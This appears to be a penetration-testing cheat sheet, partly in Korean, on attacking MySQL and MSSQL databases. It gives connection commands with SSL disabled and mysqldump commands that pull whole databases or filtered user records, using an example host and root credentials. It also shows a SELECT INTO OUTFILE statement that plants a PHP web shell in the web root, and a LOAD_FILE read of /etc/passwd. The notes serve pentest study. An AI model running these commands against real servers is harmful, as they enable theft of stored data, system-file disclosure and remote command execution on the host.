Linux

```jsx
mysql -h $IP -u [username] -p[password]
mysql -h $IP -u [username] -p[password] --skip-ssl
mysql -h $IP -u [username] -p[password] --ssl-mode=DISABLED
mysql -h $IP -u [username] -p[password] --ssl=0
```

Windows

```jsx
sqlcmd -S SRVMSSQL -U $USER -P $PWD -y 30 -Y 30
```

### DB Dump

```bash
# 데이터베이스 전체 덤프 
mysqldump -u <유저이름> -p'<비밀번호>' -P <포트> -h <ip> <데이터베이스> 

# 테이블 덤프 
mysqldump -u <유저이름> -p'<비밀번호>' -P <포트> -h <ip> <데이터베이스> <테이블이름> 

# 특정 레코드 덤프 - 예) username 열에 admin 문자열이 들어간 레코드만 덤프 
mysqldump -u <유저이름> -p'<비밀번호>' -P <포트> -h <ip> <데이터베이스> <테이블이름> --where="username LIKE '%admin%'"

# 예시 - production 데이터베이스에 users 테이블 모두 덤프 
mysqldump -u root -p'root' -h 172.31.244.116 -P 33060 production users > user.sql.dump

# 예시 - production 데이터베이스의 users 테이블에 username 열 중에서 davis 라는 문자열이 포함된 레코드만 덤프 
mysqldump -u root -p'root' -h 172.31.244.116 -P 33060 production users --where="username LIKE '%davis%' " > davis.dump
```

### Write Local Files

MySQL does not have a stored procedure like `xp_cmdshell` , but we can achieve command execution if we write to a location in the file system that can execute our commands.

In MySQL, a global system variable `secure_file_priv` limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT ... INTO OUTFILE` statements and the `LOAD_FILE()` function. These operations are permitted only to users who have the `FILE` privilege.

```bash
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

### secure_file_priv

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

In the example below, we can see the variable is empty, which means we can read and write data using MySQL

```bash
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```

### Read Local Files

by default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods

```sql
mysql> select LOAD_FILE("/etc/passwd");
```